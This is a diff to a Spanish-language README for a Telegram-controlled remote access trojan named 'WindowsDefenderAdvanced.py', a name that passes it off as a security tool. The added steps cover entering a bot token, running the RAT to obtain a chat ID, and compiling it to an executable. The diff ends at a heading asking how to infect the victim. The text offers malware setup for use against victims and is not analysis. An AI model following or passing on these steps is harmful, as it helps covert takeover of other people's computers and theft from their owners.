@@ -206,20 +206,23 @@ __Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con to
 * Editar el archivo `WindowsDefenderAdvanced.py`
 ![Archivo Windows defender advances troyano](https://i.imgur.com/5F3hN97.png)
 * Creamos en GotFather un Bot y obtenemos nuestro token
-* Entramos y agregamos nuestro token del bot y nuestro ID del Chat
-![agregar ](https://i.imgur.com/1DHzPUh.png)
-* ya agregando dicha información el RAT ya está terminado.
+* Entramos y agregamos nuestro token del bot 
+![agregar ](https://i.imgur.com/2QEyPfg.png)
+* lo que sigue despues es obtener el ID de nuestro chat, pero para eso necesitamos ua ejecutar nuestro RAT.
 * Para ejecutarlo, busque el archivo `Ejecutar.bat` => Y le damos a editar.
 ![Ejecutar.bat](https://i.imgur.com/IO15FFn.png)
 * He insertamos la ruta donde se encuentra nuestro RAT
 ![ejecutar.bat data](https://i.imgur.com/IErOgU2.png)
+* Una vez terminado ya podemos ejecutar nuestro RAT y en la consola se verá algo así.
+![](https://i.imgur.com/oxKZHcm.png)
+* Y en nuestro telegram tenemos que mandar un comando, para recibir nuestro ID del chat
+![](https://i.imgur.com/TbX0swa.png)
+* Y en nuetra consola aparecerá nuestro ID del chat
+![chat id](https://i.imgur.com/3GEs4g2.png)
+* Y este chat ID tenemos que escribirlo en el archivo `WindowsDefenderAdvanced.py` 
+![](https://i.imgur.com/psqD3sj.png)
+* Y listo, ahora nuestro RAT solo responderá a nuestro ID privado, nadie más podrá tener ese acceso. ya está listo para compilar.
 
-
-
-# Capturas de pantalla
-![]()
-![]()
-![]()
 
 ## Conversión de `*.py a *.exe`:
 * Busque el archivo `Compilar.bat`
@@ -230,6 +233,7 @@ Y colocamos la ruta de la carpeta donde se encuentra el RAT
 * => Guardamos => Ejecutamos para compilar...
 ![](https://i.imgur.com/fj0Bzri.png)
 * Listo, el RAT se compiló exitosamente.
+
 
 # Método de infección:
 ___¿Cómo infecto a la victima?___
